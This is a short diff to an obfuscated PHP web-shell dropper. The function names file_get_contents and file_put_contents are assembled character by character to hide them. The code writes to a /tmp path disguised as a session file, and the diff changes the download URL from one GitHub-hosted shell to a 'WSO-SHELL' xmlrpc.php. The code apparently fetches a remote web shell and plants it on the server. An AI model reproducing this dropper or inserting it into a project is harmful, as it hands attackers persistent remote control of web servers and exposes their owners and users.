@@ -4,7 +4,7 @@ ini_set('display_errors', 1);
 $o0 = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
 $o1 = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
 $d4 = 'sess_' . md5('5aebf9df23ff891abf76972ed0c2c46c') . '.php';
-$u5 = ['https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/inc.php', "/tmp/$d4"];
+$u5 = ['https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php', "/tmp/$d4"];
 
 function n4(){
     global $o0, $o1, $u5;
